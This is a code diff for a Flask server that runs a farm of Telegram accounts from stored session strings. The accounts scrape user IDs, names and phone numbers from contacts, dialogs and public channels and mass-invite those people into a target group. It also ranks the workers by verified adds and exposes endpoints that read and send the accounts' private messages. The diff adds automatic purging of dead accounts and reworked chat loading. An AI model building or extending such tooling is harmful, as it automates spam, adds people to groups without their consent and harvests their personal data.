@@ -3,6 +3,7 @@
 Telegram Auto-Add Server - Multi-Server Ranking System
 5 Servers with REAL Verified Statistics via Admin Account Detection
 Each server has its own admin account that verifies worker adds
+Automatic dead account removal + Fixed chat loading
 """
 
 from flask import Flask, send_file, jsonify, request
@@ -16,7 +17,8 @@ from telethon.tl.types import (
     PeerChannel, PeerUser, PeerChat,
     MessageMediaPhoto, MessageMediaDocument,
     MessageMediaWebPage, DocumentAttributeFilename,
-    User
+    User, InputPeerUser, InputPeerChat, InputPeerChannel,
+    DialogFilter, InputDialogPeer
 )
 from telethon.sessions import StringSession
 from telethon.tl.types.channel_participants import ChannelParticipantsRecent
@@ -103,11 +105,11 @@ auto_add_settings = {}
 active_clients = {}
 running_tasks = {}
 
-# NEW: Worker add tracking
-worker_adds = defaultdict(list)  # {worker_id: [{user_id, name, phone, time, verified}]}
+# Worker add tracking
+worker_adds = defaultdict(list)
 
-# NEW: Admin linked account per server
-server_admin = {}  # {server_number: admin_account_id}
+# Admin linked account per server
+server_admin = {}
 
 stats = {
     'total_added': 0,
@@ -117,7 +119,8 @@ stats = {
     'last_reset': datetime.now().strftime('%Y-%m-%d'),
     'last_verification': None,
     'daily_history': {},
-    'worker_stats': {},  # {worker_id: {total, today, verified_total, verified_today}}
+    'worker_stats': {},
+    'dead_accounts_removed': 0,
     'started_at': datetime.now().isoformat()
 }
 
@@ -158,6 +161,7 @@ def load_all():
         'last_verification': None,
         'daily_history': {},
         'worker_stats': {},
+        'dead_accounts_removed': 0,
         'started_at': datetime.now().isoformat()
     })
     stats.update(loaded_stats)
@@ -166,6 +170,7 @@ def load_all():
 load_all()
 
 def run_async(coro):
+    """Run async coroutine and return result"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
@@ -185,13 +190,11 @@ def reset_daily():
         stats['verified_today'] = 0
         stats['last_reset'] = today
         
-        # Reset worker daily stats
         for wid in stats.get('worker_stats', {}):
             stats['worker_stats'][wid]['today'] = 0
             stats['worker_stats'][wid]['verified_today'] = 0
         
         save_json(STATS_FILE, stats)
-        # Clear old worker adds (keep last 7 days)
         cleanup_old_worker_adds()
 
 def cleanup_old_worker_adds():
@@ -200,7 +203,7 @@ def cleanup_old_worker_adds():
     for wid in list(worker_adds.keys()):
         worker_adds[wid] = [
             a for a in worker_adds[wid] 
-            if datetime.fromisoformat(a.get('time', '2000-01-01T00:00:00')) > cutoff
+            if isinstance(a.get('time', ''), str) and datetime.fromisoformat(a['time']) > cutoff
         ]
     save_json(WORKER_ADDS_FILE, dict(worker_adds))
 
@@ -214,22 +217,68 @@ def send_telegram(text):
     except:
         pass
 
-def get_client(account):
-    """Create TelegramClient from account dict"""
-    session_str = account.get('session', '')
+def get_client(account_or_session):
+    """Create TelegramClient from account dict or session string"""
+    if isinstance(account_or_session, dict):
+        session_str = account_or_session.get('session', '')
+    else:
+        session_str = account_or_session
+    
     return TelegramClient(
         StringSession(session_str), API_ID, API_HASH,
-        connection_retries=10, retry_delay=3, timeout=30
+        connection_retries=10, retry_delay=3, timeout=30,
+        auto_reconnect=True
     )
+
+def remove_dead_account(account_id, reason="Unknown"):
+    """Remove a dead/unauthorized account"""
+    global accounts
+    acc_id_str = str(account_id)
+    
+    acc = next((a for a in accounts if a['id'] == account_id), None)
+    acc_name = acc.get('name', str(account_id)) if acc else str(account_id)
+    
+    # Remove from all storages
+    accounts = [a for a in accounts if a['id'] != account_id]
+    auto_add_settings.pop(acc_id_str, None)
+    running_tasks.pop(acc_id_str, None)
+    worker_adds.pop(acc_id_str, None)
+    
+    if server_admin.get(str(SERVER_NUMBER)) == account_id:
+        server_admin.pop(str(SERVER_NUMBER), None)
+        save_json(SERVER_ADMIN_FILE, server_admin)
+    
+    save_json(ACCOUNTS_FILE, accounts)
+    save_json(SETTINGS_FILE, auto_add_settings)
+    save_json(WORKER_ADDS_FILE, dict(worker_adds))
+    
+    stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
+    save_json(STATS_FILE, stats)
+    
+    logger.warning(f"🗑️ Removed dead account: {acc_name} (Reason: {reason})")
+    send_telegram(f"⚠️ <b>{SERVER_NAME}</b>\n🗑️ Removed dead account: {acc_name}\n📋 Reason: {reason}")
+    
+    return acc_name
+
+def check_account_auth(account):
+    """Check if an account is still authorized"""
+    async def check():
+        client = get_client(account)
+        await client.connect()
+        try:
+            return await client.is_user_authorized()
+        except:
+            return False
+        finally:
+            await client.disconnect()
+    
+    return run_async(check())
 
 # ============================================
 # VERIFICATION SYSTEM
 # ============================================
 def verify_worker_adds(admin_account, worker_ids):
-    """
-    Admin account checks group members and verifies which workers added them.
-    Returns: {worker_id: {verified_count, members: [{id, name, phone}]}}
-    """
+    """Admin checks group and verifies which workers added which members"""
     if not admin_account:
         return None
     
@@ -246,7 +295,6 @@ def verify_worker_adds(admin_account, worker_ids):
                 logger.error("Admin account not authorized")
                 return result
             
-            # 1. Get all group members with their details
             group = await client.get_entity(TARGET_GROUP)
             logger.info(f"📊 Fetching members from: {group.title}")
             
@@ -275,13 +323,14 @@ def verify_worker_adds(admin_account, worker_ids):
                 offset += len(participants.users)
                 if len(participants.users) < 200:
                     break
-                time.sleep(2)  # Rate limit protection
+                time.sleep(2)
             
             logger.info(f"👥 Total members in group: {len(all_members)}")
             group_member_ids = {m['id'] for m in all_members}
             group_member_map = {m['id']: m for m in all_members}
             
-            # 2. Check each worker's added list against actual group members
+            today = datetime.now().strftime('%Y-%m-%d')
+            
             for wid in worker_ids:
                 wid_str = str(wid)
                 if wid_str not in worker_adds:
@@ -289,20 +338,17 @@ def verify_worker_adds(admin_account, worker_ids):
                     continue
                 
                 adds = worker_adds[wid_str]
-                # Get today's adds only
-                today = datetime.now().strftime('%Y-%m-%d')
                 today_adds = [a for a in adds if a.get('time', '').startswith(today)]
                 
                 verified_members = []
                 for add in today_adds:
                     uid = add.get('user_id')
                     if uid and uid in group_member_ids:
-                        member_info = group_member_map[uid]
                         verified_members.append({
                             'id': uid,
-                            'name': member_info['name'],
-                            'username': member_info.get('username', ''),
-                            'phone': add.get('phone', member_info.get('phone', '')),
+                            'name': group_member_map[uid]['name'],
+                            'username': group_member_map[uid].get('username', ''),
+                            'phone': add.get('phone', group_member_map[uid].get('phone', '')),
                             'added_at': add.get('time', '')
                         })
                 
@@ -313,7 +359,6 @@ def verify_worker_adds(admin_account, worker_ids):
                     'success_rate': round(len(verified_members) / len(today_adds) * 100, 1) if today_adds else 0
                 }
                 
-                # Update worker stats
                 if 'worker_stats' not in stats:
                     stats['worker_stats'] = {}
                 if wid_str not in stats['worker_stats']:
@@ -321,11 +366,8 @@ def verify_worker_adds(admin_account, worker_ids):
                 
                 stats['worker_stats'][wid_str]['verified_today'] = len(verified_members)
                 stats['worker_stats'][wid_str]['verified_total'] += len(verified_members)
-                stats['verified_today'] += len(verified_members)
-                stats['verified_total'] += len(verified_members)
-                
-                worker_name = next((a.get('name', str(wid)) for a in accounts if a['id'] == wid), str(wid))
-                logger.info(f"✅ Worker {worker_name}: {len(verified_members)}/{len(today_adds)} verified")
+                stats['verified_today'] = stats.get('verified_today', 0) + len(verified_members)
+                stats['verified_total'] = stats.get('verified_total', 0) + len(verified_members)
             
             stats['last_verification'] = datetime.now().isoformat()
             save_json(STATS_FILE, stats)
@@ -369,7 +411,6 @@ def auto_add_worker(account):
     joined = False
     cycle_count = 0
     
-    # Initialize worker stats
     if 'worker_stats' not in stats:
         stats['worker_stats'] = {}
     if acc_key not in stats['worker_stats']:
@@ -397,17 +438,20 @@ def auto_add_worker(account):
                 loop.run_until_complete(client.connect())
                 
                 if not loop.run_until_complete(client.is_user_authorized()):
-                    logger.error(f"Account {acc_id} not authorized")
+                    logger.error(f"Account {acc_id} not authorized - removing")
                     loop.close()
-                    time.sleep(120)
-                    continue
+                    remove_dead_account(acc_id, "Session unauthorized")
+                    return  # Exit thread
                 
-                # Get account info for tracking
                 me = loop.run_until_complete(client.get_me())
                 worker_phone = me.phone or account.get('phone', '')
                 worker_name = (me.first_name or '') + (' ' + me.last_name if me.last_name else 'User')
                 
-                # Auto-join group
+                # Update account name
+                account['name'] = worker_name
+                account['phone'] = worker_phone
+                save_json(ACCOUNTS_FILE, accounts)
+                
                 if not joined:
                     try:
                         grp = loop.run_until_complete(client.get_entity(TARGET_GROUP))
@@ -418,7 +462,6 @@ def auto_add_worker(account):
                         if 'already' in str(e).lower() or 'participant' in str(e).lower():
                             joined = True
                 
-                # Get target group
                 try:
                     group = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                 except:
@@ -426,10 +469,8 @@ def auto_add_worker(account):
                     time.sleep(120)
                     continue
                 
-                # Collect members from ALL sources
                 all_ids = set()
                 
-                # 1. Contacts
                 try:
                     contacts = loop.run_until_complete(client(GetContactsRequest(0)))
                     for c in contacts.users:
@@ -439,7 +480,6 @@ def auto_add_worker(account):
                 except Exception as e:
                     logger.error(f"Contacts error: {e}")
                 
-                # 2. Dialogs
                 try:
                     dialogs = loop.run_until_complete(client.get_dialogs(limit=500))
                     for d in dialogs:
@@ -449,7 +489,6 @@ def auto_add_worker(account):
                 except Exception as e:
                     logger.error(f"Dialogs error: {e}")
                 
-                # 3. Scrape source groups
                 source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest', '@TelegramNews']
                 for sg in source_groups:
                     try:
@@ -460,7 +499,6 @@ def auto_add_worker(account):
                 
                 logger.info(f"🔍 Total collected: {len(all_ids)}")
                 
-                # Filter fresh
                 fresh = list(all_ids - attempted)
                 if not fresh or len(fresh) < 20:
                     attempted.clear()
@@ -474,7 +512,6 @@ def auto_add_worker(account):
                 
                 logger.info(f"🔄 Cycle {cycle_count}: {len(fresh)} members to try")
                 
-                # Get user details for tracking before adding
                 user_details = {}
                 for uid in fresh[:300]:
                     try:
@@ -498,7 +535,6 @@ def auto_add_worker(account):
                         user_input = loop.run_until_complete(client.get_input_entity(uid))
                         loop.run_until_complete(client(InviteToChannelRequest(group, [user_input])))
                         
-                        # TRACK THE ADD
                         add_record = {
                             'user_id': uid,
                             'name': user_details.get(uid, {}).get('name', ''),
@@ -512,8 +548,9 @@ def auto_add_worker(account):
                         
                         stats['today_added'] = stats.get('today_added', 0) + 1
                         stats['total_added'] = stats.get('total_added', 0) + 1
-                        stats['worker_stats'][acc_key]['today'] += 1
-                        stats['worker_stats'][acc_key]['total'] += 1
+                        if acc_key in stats.get('worker_stats', {}):
+                            stats['worker_stats'][acc_key]['today'] = stats['worker_stats'][acc_key].get('today', 0) + 1
+                            stats['worker_stats'][acc_key]['total'] = stats['worker_stats'][acc_key].get('total', 0) + 1
                         added_this_cycle += 1
                         
                         if added_this_cycle % 20 == 0:
@@ -538,16 +575,20 @@ def auto_add_worker(account):
                 save_json(STATS_FILE, stats)
                 save_json(WORKER_ADDS_FILE, dict(worker_adds))
                 
-                # Send report every 50 adds
                 if added_this_cycle > 30:
                     send_telegram(
                         f"📊 <b>{SERVER_NAME}</b> - Worker: {worker_name}\n"
                         f"🔄 Cycle: {cycle_count}\n"
-                        f"✅ Added this cycle: {added_this_cycle}\n"
-                        f"📅 Today (attempted): {stats['today_added']:,}\n"
-                        f"📊 Total (attempted): {stats['total_added']:,}"
+                        f"✅ Added: {added_this_cycle}\n"
+                        f"📅 Today: {stats['today_added']:,}\n"
+                        f"📊 Total: {stats['total_added']:,}"
                     )
                 
+            except errors.rpcerrorlist.AuthKeyUnregisteredError:
+                logger.error(f"Auth key unregistered for account {acc_id}")
+                loop.close()
+                remove_dead_account(acc_id, "Auth key unregistered")
+                return
             except Exception as e:
                 logger.error(f"Loop error: {e}")
             finally:
@@ -627,6 +668,7 @@ def health():
         'total_attempted': stats.get('total_added', 0),
         'total_verified': stats.get('verified_total', 0),
         'admin_linked': admin_linked,
+        'dead_removed': stats.get('dead_accounts_removed', 0),
         'last_verification': stats.get('last_verification')
     })
 
@@ -746,7 +788,6 @@ def verify_code():
                 }
                 save_json(SETTINGS_FILE, auto_add_settings)
                 
-                # Initialize worker stats
                 if 'worker_stats' not in stats:
                     stats['worker_stats'] = {}
                 stats['worker_stats'][str(new_id)] = {
@@ -754,14 +795,12 @@ def verify_code():
                 }
                 save_json(STATS_FILE, stats)
                 
-                # Auto-join group
                 try:
                     grp = await client.get_entity(TARGET_GROUP)
                     await client(JoinChannelRequest(grp))
                 except:
                     pass
                 
-                # Start worker
                 start_auto_add(new_acc)
                 
                 return {
@@ -793,6 +832,7 @@ def get_accounts():
     for a in accounts:
         aid_str = str(a['id'])
         ws = stats.get('worker_stats', {}).get(aid_str, {})
+        is_admin = server_admin.get(str(SERVER_NUMBER)) == a['id']
         acc_list.append({
             'id': a['id'],
             'name': a.get('name', '?'),
@@ -800,7 +840,8 @@ def get_accounts():
             'username': a.get('username', ''),
             'active': a.get('active', True),
             'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
-            'is_admin': server_admin.get(str(SERVER_NUMBER)) == a['id'],
+            'is_admin': is_admin,
+            'is_server_admin': is_admin,
             'stats': {
                 'total_attempted': ws.get('total', 0),
                 'today_attempted': ws.get('today', 0),
@@ -814,22 +855,194 @@ def get_accounts():
 def remove_account():
     global accounts
     aid = request.json.get('accountId')
-    aid_str = str(aid)
-    
-    accounts = [a for a in accounts if a['id'] != aid]
-    auto_add_settings.pop(aid_str, None)
-    running_tasks.pop(aid_str, None)
-    worker_adds.pop(aid_str, None)
-    
-    # Remove from server admin if this was the admin
-    if server_admin.get(str(SERVER_NUMBER)) == aid:
-        server_admin.pop(str(SERVER_NUMBER), None)
-        save_json(SERVER_ADMIN_FILE, server_admin)
-    
-    save_json(ACCOUNTS_FILE, accounts)
-    save_json(SETTINGS_FILE, auto_add_settings)
-    save_json(WORKER_ADDS_FILE, dict(worker_adds))
-    return jsonify({'success': True, 'message': 'Account removed'})
+    name = remove_dead_account(aid, "Manual removal")
+    return jsonify({'success': True, 'message': f'Removed: {name}'})
+
+# ============================================
+# FIXED: GET MESSAGES / CHATS
+# ============================================
+@app.route('/api/get-messages', methods=['POST'])
+def get_messages():
+    """Get chats (dialogs) and messages for dashboard - FIXED"""
+    try:
+        data = request.json
+        aid = data.get('accountId')
+        acc = next((a for a in accounts if a['id'] == aid), None)
+        if not acc:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def fetch():
+            client = get_client(acc)
+            await client.connect()
+            try:
+                # Check authorization first
+                try:
+                    is_auth = await client.is_user_authorized()
+                except errors.rpcerrorlist.AuthKeyUnregisteredError:
+                    await client.disconnect()
+                    remove_dead_account(aid, "Auth key unregistered")
+                    return {'success': False, 'error': 'auth_key_unregistered'}
+                except Exception as e:
+                    await client.disconnect()
+                    remove_dead_account(aid, f"Auth check failed: {str(e)[:50]}")
+                    return {'success': False, 'error': 'auth_key_unregistered'}
+                
+                if not is_auth:
+                    await client.disconnect()
+                    remove_dead_account(aid, "Session unauthorized")
+                    return {'success': False, 'error': 'auth_key_unregistered'}
+                
+                # Fetch dialogs
+                try:
+                    dialogs = await client.get_dialogs(limit=100)
+                except Exception as e:
+                    logger.error(f"Get dialogs error: {e}")
+                    return {'success': False, 'error': f'Failed to load dialogs: {str(e)[:100]}'}
+                
+                chats_list = []
+                all_messages = []
+                
+                for dialog in dialogs:
+                    try:
+                        chat_id = str(dialog.id)
+                        chat_type = 'user'
+                        title = dialog.name or 'Unknown'
+                        
+                        if dialog.is_group:
+                            chat_type = 'group'
+                        elif dialog.is_channel:
+                            chat_type = 'channel'
+                        
+                        entity = dialog.entity
+                        if hasattr(entity, 'bot') and entity.bot:
+                            chat_type = 'bot'
+                        
+                        last_msg_text = ''
+                        last_msg_date = 0
+                        last_msg_media = None
+                        
+                        if dialog.message:
+                            last_msg_text = (dialog.message.message or '')[:200]
+                            last_msg_date = dialog.message.date.timestamp() if dialog.message.date else 0
+                            
+                            if dialog.message.media:
+                                if hasattr(dialog.message.media, 'photo'):
+                                    last_msg_media = 'photo'
+                                elif hasattr(dialog.message.media, 'document'):
+                                    last_msg_media = 'document'
+                                elif hasattr(dialog.message.media, 'webpage'):
+                                    last_msg_media = 'link'
+                        
+                        chats_list.append({
+                            'id': chat_id,
+                            'title': title,
+                            'type': chat_type,
+                            'unread': dialog.unread_count or 0,
+                            'lastMessage': last_msg_text,
+                            'lastMessageDate': last_msg_date,
+                            'lastMessageMedia': last_msg_media
+                        })
+                        
+                        # Fetch recent messages (limit to prevent timeouts)
+                        try:
+                            messages = await client.get_messages(entity, limit=15)
+                            for msg in messages:
+                                if not msg.message and not msg.media:
+                                    continue
+                                
+                                media_type = None
+                                has_media = False
+                                
+                                if msg.media:
+                                    has_media = True
+                                    if hasattr(msg.media, 'photo'):
+                                        media_type = 'photo'
+                                    elif hasattr(msg.media, 'document'):
+                                        media_type = 'document'
+                                    elif hasattr(msg.media, 'webpage'):
+                                        media_type = 'link'
+                                    else:
+                                        media_type = 'media'
+                                
+                                all_messages.append({
+                                    'chatId': chat_id,
+                                    'id': msg.id,
+                                    'text': msg.message or '',
+                                    'date': msg.date.timestamp() if msg.date else 0,
+                                    'out': msg.out,
+                                    'hasMedia': has_media,
+                                    'mediaType': media_type
+                                })
+                        except Exception as e:
+                            logger.debug(f"Messages fetch error for {title}: {e}")
+                            pass
+                        
+                    except Exception as e:
+                        logger.debug(f"Dialog processing error: {e}")
+                        continue
+                
+                logger.info(f"📱 Loaded {len(chats_list)} chats, {len(all_messages)} messages for {acc.get('name')}")
+                
+                return {
+                    'success': True,
+                    'chats': chats_list,
+                    'messages': all_messages
+                }
+            except Exception as e:
+                logger.error(f"Get messages outer error: {e}")
+                return {'success': False, 'error': f'Error: {str(e)[:100]}'}
+            finally:
+                await client.disconnect()
+        
+        return jsonify(run_async(fetch()))
+    except Exception as e:
+        logger.error(f"API get-messages error: {e}")
+        return jsonify({'success': False, 'error': str(e)[:100]})
+
+@app.route('/api/send-message', methods=['POST'])
+def send_message():
+    """Send a message from an account"""
+    try:
+        data = request.json
+        aid = data.get('accountId')
+        chat_id = data.get('chatId')
+        message = data.get('message', '').strip()
+        
+        if not message:
+            return jsonify({'success': False, 'error': 'Message required'})
+        
+        acc = next((a for a in accounts if a['id'] == aid), None)
+        if not acc:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def send():
+            client = get_client(acc)
+            await client.connect()
+            try:
+                # Parse chat_id
+                try:
+                    chat_id_int = int(chat_id)
+                    # Try peer types
+                    try:
+                        entity = await client.get_entity(PeerUser(chat_id_int))
+                    except:
+                        try:
+                            entity = await client.get_entity(PeerChat(chat_id_int))
+                        except:
+                            entity = await client.get_entity(PeerChannel(chat_id_int))
+                except:
+                    entity = await client.get_entity(chat_id)
+                
+                await client.send_message(entity, message)
+                return {'success': True}
+            except Exception as e:
+                return {'success': False, 'error': str(e)[:100]}
+            finally:
+                await client.disconnect()
+        
+        return jsonify(run_async(send()))
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)[:100]})
 
 # ============================================
 # ADMIN LINKING ROUTES
@@ -843,12 +1056,10 @@ def link_admin():
     if not admin_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
     
-    # Verify account exists
     acc = next((a for a in accounts if a['id'] == admin_id), None)
     if not acc:
         return jsonify({'success': False, 'error': 'Account not found'})
     
-    # Verify account can access the group
     async def check_admin():
         client = get_client(acc)
         await client.connect()
@@ -858,17 +1069,16 @@ def link_admin():
             
             group = await client.get_entity(TARGET_GROUP)
             
-            # Check if user is admin
             try:
                 participant = await client(functions.channels.GetParticipantRequest(group, 'me'))
                 is_admin = hasattr(participant.participant, 'admin_rights') and participant.participant.admin_rights
                 
                 if not is_admin:
-                    return False, 'Account is NOT an admin of the target group. Please make it admin first.'
+                    return False, 'Account is NOT an admin of the target group'
                 
                 return True, 'Admin verified successfully'
             except Exception as e:
-                return False, f'Cannot verify admin status: {str(e)}'
+                return False, f'Cannot verify admin: {str(e)[:100]}'
         finally:
             await client.disconnect()
     
@@ -878,26 +1088,24 @@ def link_admin():
         server_admin[str(SERVER_NUMBER)] = admin_id
         save_json(SERVER_ADMIN_FILE, server_admin)
         
-        # Update settings to mark this account as admin
         auto_add_settings[str(admin_id)] = auto_add_settings.get(str(admin_id), {})
         auto_add_settings[str(admin_id)]['is_server_admin'] = True
         save_json(SETTINGS_FILE, auto_add_settings)
         
         logger.info(f"🔗 Admin linked: {acc['name']} -> Server {SERVER_NAME}")
+        send_telegram(f"🔗 <b>{SERVER_NAME}</b>\n👑 Admin linked: {acc['name']}")
         return jsonify({'success': True, 'message': f'Admin linked: {acc["name"]}', 'admin_name': acc['name']})
     
     return jsonify({'success': False, 'error': result[1]})
 
 @app.route('/api/unlink-admin', methods=['POST'])
 def unlink_admin():
-    """Unlink admin account"""
     server_admin.pop(str(SERVER_NUMBER), None)
     save_json(SERVER_ADMIN_FILE, server_admin)
     return jsonify({'success': True, 'message': 'Admin unlinked'})
 
 @app.route('/api/admin-status')
 def admin_status():
-    """Get admin linking status"""
     admin_id = server_admin.get(str(SERVER_NUMBER))
     if admin_id:
         acc = next((a for a in accounts if a['id'] == admin_id), None)
@@ -921,17 +1129,16 @@ def trigger_verification():
     admin_id = server_admin.get(str(SERVER_NUMBER))
     
     if not admin_id:
-        return jsonify({'success': False, 'error': 'No admin account linked. Link an admin first.'})
+        return jsonify({'success': False, 'error': 'No admin account linked'})
     
     admin_acc = next((a for a in accounts if a['id'] == admin_id), None)
     if not admin_acc:
         return jsonify({'success': False, 'error': 'Admin account not found'})
     
-    # Get all worker IDs (accounts that are NOT the admin)
     worker_ids = [a['id'] for a in accounts if a['id'] != admin_id]
     
     if not worker_ids:
-        return jsonify({'success': False, 'error': 'No worker accounts to verify'})
+        return jsonify({'success': False, 'error': 'No worker accounts'})
     
     result = verify_worker_adds(admin_acc, worker_ids)
     
@@ -941,7 +1148,6 @@ def trigger_verification():
     total_verified = sum(r.get('verified_count', 0) for r in result.values())
     total_attempted = sum(r.get('attempted', 0) for r in result.values())
     
-    # Build worker details
     workers_detail = []
     for wid, data in result.items():
         acc = next((a for a in accounts if a['id'] == wid), None)
@@ -968,7 +1174,6 @@ def trigger_verification():
 
 @app.route('/api/verified-stats')
 def verified_stats():
-    """Get verified stats for this server"""
     reset_daily()
     
     workers_detail = []
@@ -1001,7 +1206,7 @@ def verified_stats():
     })
 
 # ============================================
-# AUTO-ADD SETTINGS ROUTES
+# REMAINING ROUTES (auto-add settings, test, join, sessions, ranking, report)
 # ============================================
 @app.route('/api/auto-add-settings', methods=['GET', 'POST'])
 def auto_add_settings_route():
@@ -1009,10 +1214,7 @@ def auto_add_settings_route():
         aid = request.args.get('accountId')
         aid_str = str(aid)
         s = auto_add_settings.get(aid_str, {
-            'enabled': False, 
-            'target_group': TARGET_GROUP, 
-            'delay_seconds': 25,
-            'auto_join': True
+            'enabled': False, 'target_group': TARGET_GROUP, 'delay_seconds': 25, 'auto_join': True
         })
         s['account_id'] = aid
         s['added_today'] = stats.get('today_added', 0)
@@ -1023,11 +1225,8 @@ def auto_add_settings_route():
         s['server_number'] = SERVER_NUMBER
         s['is_admin'] = server_admin.get(str(SERVER_NUMBER)) == aid
         s['server_admin_id'] = server_admin.get(str(SERVER_NUMBER))
-        
-        # Get this worker's personal stats
         ws = stats.get('worker_stats', {}).get(aid_str, {})
         s['worker_stats'] = ws
-        
         return jsonify({'success': True, 'settings': s})
     
     data = request.json
@@ -1043,7 +1242,6 @@ def auto_add_settings_route():
         'last_updated': datetime.now().isoformat()
     }
     
-    # Keep admin status if set
     if server_admin.get(str(SERVER_NUMBER)) == aid:
         auto_add_settings[akey]['is_server_admin'] = True
     
@@ -1061,7 +1259,6 @@ def auto_add_stats():
     reset_daily()
     aid = request.args.get('accountId')
     aid_str = str(aid) if aid else None
-    
     ws = stats.get('worker_stats', {}).get(aid_str, {}) if aid_str else {}
     
     return jsonify({
@@ -1092,22 +1289,18 @@ def test_auto_add():
                 
                 group_found = False
                 group_title = TARGET_GROUP
+                member_count = 0
                 try:
                     grp = await client.get_entity(TARGET_GROUP)
                     group_found = True
                     group_title = getattr(grp, 'title', TARGET_GROUP)
-                    
-                    # Get member count
                     participants = await client(GetParticipantsRequest(
-                        channel=grp,
-                        filter=ChannelParticipantsRecent(),
-                        offset=0,
-                        limit=1,
-                        hash=0
+                        channel=grp, filter=ChannelParticipantsRecent(),
+                        offset=0, limit=1, hash=0
                     ))
                     member_count = participants.count if hasattr(participants, 'count') else len(participants.users)
                 except:
-                    member_count = 0
+                    pass
                 
                 available = 0
                 try:
@@ -1134,7 +1327,7 @@ def test_auto_add():
         
         return jsonify(run_async(test()))
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': False, 'error': str(e)[:100]})
 
 @app.route('/api/join-group', methods=['POST'])
 def join_group():
@@ -1155,204 +1348,19 @@ def join_group():
             except Exception as e:
                 if 'already' in str(e).lower():
                     return {'success': True, 'message': 'Already member'}
-                return {'success': False, 'error': str(e)}
+                return {'success': False, 'error': str(e)[:100]}
             finally:
                 await client.disconnect()
         
         return jsonify(run_async(join()))
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': False, 'error': str(e)[:100]})
 
 # ============================================
-# DASHBOARD MESSAGING ROUTES
-# ============================================
-@app.route('/api/get-messages', methods=['POST'])
-def get_messages():
-    """Get chats (dialogs) and messages for dashboard"""
-    try:
-        data = request.json
-        aid = data.get('accountId')
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def fetch():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'auth_key_unregistered'}
-                
-                dialogs = await client.get_dialogs(limit=100)
-                
-                chats_list = []
-                all_messages = []
-                
-                for dialog in dialogs:
-                    chat_id = str(dialog.id)
-                    chat_type = 'user'
-                    
-                    if dialog.is_group:
-                        chat_type = 'group'
-                    elif dialog.is_channel:
-                        chat_type = 'channel'
-                    
-                    entity = dialog.entity
-                    title = dialog.name or 'Unknown'
-                    
-                    # Check if bot
-                    if hasattr(entity, 'bot') and entity.bot:
-                        chat_type = 'bot'
-                    
-                    # Get last message
-                    last_msg_text = ''
-                    last_msg_date = 0
-                    last_msg_media = None
-                    
-                    if dialog.message:
-                        last_msg_text = dialog.message.message or ''
-                        last_msg_date = dialog.message.date.timestamp() if dialog.message.date else 0
-                        
-                        if dialog.message.media:
-                            if hasattr(dialog.message.media, 'photo'):
-                                last_msg_media = 'photo'
-                            elif hasattr(dialog.message.media, 'document'):
-                                last_msg_media = 'document'
-                            elif hasattr(dialog.message.media, 'webpage'):
-                                last_msg_media = 'link'
-                    
-                    chats_list.append({
-                        'id': chat_id,
-                        'title': title,
-                        'type': chat_type,
-                        'unread': dialog.unread_count or 0,
-                        'lastMessage': last_msg_text,
-                        'lastMessageDate': last_msg_date,
-                        'lastMessageMedia': last_msg_media
-                    })
-                    
-                    # Fetch recent messages for this chat
-                    try:
-                        messages = await client.get_messages(entity, limit=20)
-                        for msg in messages:
-                            if not msg.message and not msg.media:
-                                continue
-                            
-                            media_type = None
-                            has_media = False
-                            
-                            if msg.media:
-                                has_media = True
-                                if hasattr(msg.media, 'photo'):
-                                    media_type = 'photo'
-                                elif hasattr(msg.media, 'document'):
-                                    media_type = 'document'
-                                elif hasattr(msg.media, 'webpage'):
-                                    media_type = 'link'
-                                else:
-                                    media_type = 'media'
-                            
-                            all_messages.append({
-                                'chatId': chat_id,
-                                'id': msg.id,
-                                'text': msg.message or '',
-                                'date': msg.date.timestamp() if msg.date else 0,
-                                'out': msg.out,
-                                'hasMedia': has_media,
-                                'mediaType': media_type
-                            })
-                    except:
-                        pass
-                
-                return {
-                    'success': True,
-                    'chats': chats_list,
-                    'messages': all_messages
-                }
-            except Exception as e:
-                logger.error(f"Get messages error: {e}")
-                return {'success': False, 'error': str(e)}
-            finally:
-                await client.disconnect()
-        
-        return jsonify(run_async(fetch()))
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/send-message', methods=['POST'])
-def send_message():
-    """Send a message from an account"""
-    try:
-        data = request.json
-        aid = data.get('accountId')
-        chat_id = data.get('chatId')
-        message = data.get('message', '').strip()
-        
-        if not message:
-            return jsonify({'success': False, 'error': 'Message required'})
-        
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def send():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                # Parse chat_id - could be int or username
-                try:
-                    chat_id_int = int(chat_id)
-                    entity = await client.get_entity(PeerUser(chat_id_int))
-                except:
-                    entity = await client.get_entity(chat_id)
-                
-                await client.send_message(entity, message)
-                return {'success': True}
-            except Exception as e:
-                return {'success': False, 'error': str(e)}
-            finally:
-                await client.disconnect()
-        
-        return jsonify(run_async(send()))
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/media/<int:account_id>/<int:message_id>')
-def get_media(account_id, message_id):
-    """Download and serve media from a message"""
-    try:
-        acc = next((a for a in accounts if a['id'] == account_id), None)
-        if not acc:
-            return jsonify({'error': 'Account not found'}), 404
-        
-        async def download():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                message = await client.get_messages(None, ids=message_id)
-                if not message or not message.media:
-                    return None
-                
-                import tempfile
-                path = tempfile.mktemp(suffix='.jpg')
-                await client.download_media(message, path)
-                return path
-            finally:
-                await client.disconnect()
-        
-        path = run_async(download())
-        if path and os.path.exists(path):
-            return send_file(path)
-        return jsonify({'error': 'Media not found'}), 404
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-# ============================================
